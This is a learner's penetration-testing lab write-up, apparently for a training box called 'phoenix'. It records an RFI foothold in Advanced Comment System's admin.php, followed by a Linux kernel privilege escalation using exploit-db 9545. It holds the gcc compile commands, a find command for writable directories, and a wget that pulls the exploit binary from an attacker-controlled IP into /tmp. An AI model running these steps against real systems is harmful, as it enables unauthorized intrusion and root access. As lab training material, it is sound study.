<title>privilege escalation</title>
</head><body>uname -a shows kernel version<br/>
kernel is vulnerable to this exploit: https://www.exploit-db.com/exploits/9545/<br/>
<br/>
downloaded code and compiled with command:<br/>
gcc -Wall -o linux-sendpage 9545.c<br/>
<br/>
Trying to transfer to the file.<br/>
<br/>
ftp won't work. no route to host or can't write files<br/>
phoenix doesn't know tftp<br/>
can't powershell since it is linux<br/>
tried creating a file with vi or nano but freezes<br/>
<br/>
followed this excellent guide for using the FIND command to find writeable directories:<br/>
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/<br/>
find /-perm -222 -type d 2&gt;/dev/null<br/>
<br/>
was able to use wget inside /tmp:<br/>
wget http://10.11.0.187/phoenix<br/>
<br/>
ended up not working--&gt; error while loading shared libraries: requires glibc 2.5 or later dynamic linker<br/>
<br/>
Solution: (no space between comma and --hash-style)<br/>
gcc -m32 -Wl,--hash-style=both 9545.c -o phoenix <br/>

I was stuck on this one for three days. I came out learning a lot more about Linux.<br/>
<br/>
- Used a popular enumeration tool which is covered in the videos/pdf to find something that "might be interesting."<br/>
- Vulnerability I exploited is common and is covered in the videos/pdf. (RFI)<br/>
- Looked at source code and noticed ACS. Googled to find out what ACS is... = Advanced Comment System. Googled for vulnerability. Found it and exploited RFI on its admin.php page.<br/>
- I didn't use nc to send the shell to my Kali machine. You can use Linux's own shell with the right command that I found via Google.<br/>
- With low-priv shell, used uname -a and found easily via Google an exploit which works.<br/>
- Compile on Kali and use the correct gcc compile options found if you Google the error message. It's also on the forum.<br/>
- Use this excellent guide to help "find" a place where you will be able to download the code from your Kali machine: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/<br/>
<br/>
This was only my third box and took me probably around 16 hours or so. Felt dumb but kept at it. <br/>
